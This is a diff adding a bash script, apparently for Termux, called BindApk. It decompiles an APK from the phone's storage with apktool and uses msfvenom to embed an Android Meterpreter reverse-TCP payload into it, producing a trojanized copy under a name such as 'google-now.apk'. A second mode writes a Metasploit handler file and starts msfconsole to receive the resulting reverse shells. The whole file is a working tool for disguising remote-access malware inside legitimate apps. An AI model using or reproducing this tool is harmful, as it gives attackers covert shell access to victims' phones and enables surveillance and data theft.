@@ -1,0 +1,274 @@
+#! /usr/bin/env bash
+if [[ "$1" == "handler" ]]; then
+	pg_ctl --log=$HOME/.log_msf -D $PREFIX/val/lib/postgresql restart $> /dev/null;
+	clear
+	if [ -e $TMPDIR/handler.rc ]; then
+		rm $TMPDIR/handler.rc
+	fi
+echo
+echo -e "\033[33m$(figlet -f Remo773 "M-CoNsOlE")\e[0m"
+echo -e "\e[1;32m
++--------------------------------------*/ \e[32m"
+echo
+echo "use multi/handler" >> $TMPDIR/handler.rc
+echo "set payload android/meterpreter/reverse_tcp" >> $TMPDIR/handler.rc
+echo "set LHOST $2" >> $TMPDIR/handler.rc
+echo "set LPORT $3" >> $TMPDIR/handler.rc
+echo "Payload	: android/meterpreter/reverse_tcp"
+echo "LHOST	: $2"
+echo "LPORT	: $3"
+echo -e "\e[1;32m
++--------------------------------------*/ \e[33m"
+echo
+read -p " Do you want to continue (Y/n) : " msf
+if [ "$msf" = "y" -o "$msf" = "Y" ]; then
+	echo
+echo -e "\e[1;34m[*] \e[33mPlease wait... \e[32m"
+echo
+exec $PREFIX/bin/msfconsole -r $TMPDIR/handler.rc
+else
+	exit 1
+fi
+else
+clear
+tmpdir=~/kali-fs/root/.bind
+echo
+echo -e "\033[33m$(figlet -f Remo773 "BindApk")\e[0m"
+echo -e "\e[1;32m
++--------------------------------------*/"
+echo -e "Remo773 : (\e[33m26.5.2019\e[33m)"
+echo -e "		\e[1;32mV1.4\e[1;32m"
+echo -e "1. \e[1;33mCheck apk\e[1;32m"
+echo -e "2. \e[1;33mEmbed payload\e[1;32m"
+echo -e "3. \e[1;33mExit\e[1;32m"
+echo -e "
++--------------------------------------*/
+\033[1;33m";
+read -p "choose your potion: " opt
+case "$opt" in
+1)
+clear
+rm -rf $tmpdir/*
+echo 
+echo -e "\e[1;33m1. check apk\e[1;32m"
+echo -e "
++--------------------------------------*/
+\033[1;33m";
+echo
+echo "a. /sdcard"
+echo
+echo "b. /sdcard/Download"
+echo -e "\e[1;32m
++--------------------------------------*/
+\033[1;33m";
+read -p "choose your option: " dir2
+case $dir2 in
+a)
+clear
+echo
+echo "a. /sdcard"
+echo -e "\e[1;32m
++--------------------------------------*/
+\033[1;33m";
+ls /sdcard | grep "\.apk$" | cat -n
+
+echo -e "\e[1;32m
++--------------------------------------*/
+\033[1;33m";
+read -p "choose your app : " aapk
+if [ $aapk = "x" ]; then
+exit 1
+else
+output=`ls /sdcard | grep "\.apk$" | cat -n | sed -n $aapk'p' | awk '{print $2}'`
+clear
+echo
+cp /sdcard/$output  $tmpdir/original.apk
+echo -e "\e[1;34m[*] \e[33mDecompiling... \e[35m$output\e[32m";
+echo
+kapktool d .bind/original.apk -o .bind/original
+echo
+echo -e "\e[1;34m[*] \e[33mRecompiling... \e[35m$output\e[32m";
+echo
+kapktool b -a /usr/bin/aapt -o .bind/output.apk .bind/original
+echo
+if [ -e $tmpdir/output.apk ]; then
+echo -e "\e[1;34m[*] \e[33mYou can bind payload on \e[35m$output\e[32m";
+else
+	echo -e "\e[1;34m[*] \e[33mUnable to Recompile.. \e[35m$output \e[33mwith apktool\e[32m";
+fi
+					
+fi
+echo
+
+;;
+b)
+clear
+echo
+echo "b. /sdcard/Download"
+echo -e "\e[1;32m
++--------------------------------------*/
+\033[1;33m";
+echo
+ls /sdcard/Download | grep "\.apk$" | cat -n
+
+echo -e "\e[1;32m
++--------------------------------------*/
+\033[1;33m";
+read -p "choose your app : " aapk
+if [ $aapk = "x" ]; then
+exit 1
+else
+output=`ls /sdcard/Download | grep "\.apk$" | cat -n | sed -n $aapk'p' | awk '{print $2}'`
+clear
+cp /sdcard/Download/$output  $tmpdir/original.apk
+echo
+echo -e "\e[1;34m[*] \e[33mDecompiling... \e[35m$output\e[32m";
+echo
+kapktool d .bind/original.apk -o .bind/original
+echo
+echo -e "\e[1;34m[*] \e[33mRecompiling... \e[35m$output\e[32m";
+echo
+kapktool b -a /usr/bin/aapt -o .bind/output.apk .bind/original
+echo
+if [ -e $tmpdir/output.apk ]; then
+echo -e "\e[1;34m[*] \e[33mYou can bind payload on \e[32m$output\e[32m";
+else
+	echo -e "\e[1;34m[*] \e[33mUnable to Recompile... \e[35m$output \e[33mwith apktool\e[32m";
+fi
+
+fi
+;;
+esac
+;;
+2)
+clear
+rm -rf $tmpdir/*
+echo "2. embed payload"
+echo -e "\e[1;32m
++--------------------------------------*/
+\033[1;33m";
+echo
+echo -e "a. \e[35m/sdcard\e[1;33m"
+echo
+echo -e "b. \e[35m/sdcard/Download"
+echo -e "\e[1;32m
++--------------------------------------*/
+\033[1;33m";
+echo
+read -p "choose your option: " dir
+case $dir in
+a)
+clear
+echo
+echo "a. /sdcard"
+echo -e "\e[1;32m
++--------------------------------------*/
+\033[1;33m";
+echo
+ls /sdcard | grep "\.apk$" | cat -n
+echo -e "\e[1;32m
++--------------------------------------*/
+\033[1;33m";
+echo
+read -p "choose your app : " aapk
+if [ "$aapk" = "x" ]; then
+exit 1
+else
+output=`ls /sdcard | grep "\.apk$" | cat -n | sed -n $aapk'p' | awk '{print $2}'`
+echo $output
+read -p "
+Example : 127.0.0.1
+Type Your LHOST : " lh
+echo
+read -p "
+Example : 4444
+Type Your LPORT : " lp
+echo
+read -p "
+Example : /sdcard/google-now.apk
+Type Your Final app name
+with destination path : " final
+echo -e "\e[0m"
+sleep 2
+clear
+echo
+echo -e "\e[1;32m
++--------------------------------------*/
+\033[1;33m";
+echo "Orignal.apk       : $output"
+echo "LHOST             : $lh"
+echo "LPORT             : $lp"
+echo "Final.apk         : $final"
+echo -e "\e[1;32m
++--------------------------------------*/
+\033[1;33m";
+echo
+echo -e "\e[1;34m[*] \e[33mPlease wait... \e[32m";
+echo
+msfvenom -x /sdcard/$output -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp --platform android --arch dalvik -o $final
+echo -e "\e[0m"
+fi
+
+;;
+b)
+clear
+echo
+echo "b. /sdcard/Download"
+echo -e "\e[1;32m
++--------------------------------------*/
+\033[1;33m";
+echo
+ls /sdcard/Download | grep "\.apk$" | cat -n
+echo -e "\e[1;32m
++--------------------------------------*/
+\033[1;33m";
+echo
+read -p "choose your app : " aapk
+if [ $aapk = "x" -o -z $aapk ]; then
+exit 1
+else
+output=`ls /sdcard/Download | grep "\.apk$" | cat -n | sed -n $aapk'p' | awk '{print $2}'`
+echo $output
+read -p "
+Example : 127.0.0.1
+Type Your LHOST : " lh
+echo
+read -p "
+Example : 4444
+Type Your LPORT : " lp
+echo
+read -p "
+Example : /sdcard/google-now.apk
+Type Your Final app name
+with destination path : " final
+echo
+sleep 2
+clear
+echo -e "\e[1;32m
++--------------------------------------*/
+\033[1;33m";
+echo
+echo "Orignal.apk       : $output"
+echo "LHOST             : $lh"
+echo "LPORT             : $lp"
+echo "Final.apk		: $final"
+echo -e "\e[1;32m
++--------------------------------------*/
+\033[1;33m";
+echo
+echo -e "\e[1;34m[*] \e[33mPlease wait... \e[32m";
+echo
+msfvenom -x /sdcard/Download/$output -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp --platform android --arch dalvik -o $final
+echo -e "\e[0m"
+fi
+;;
+esac
+;;
+3)
+echo -e "\e[1;32m"
+echo -e "bye! bye!\e[0m"
+;;
+esac
+echo -e "\e[0m"
+fi
+exit 0
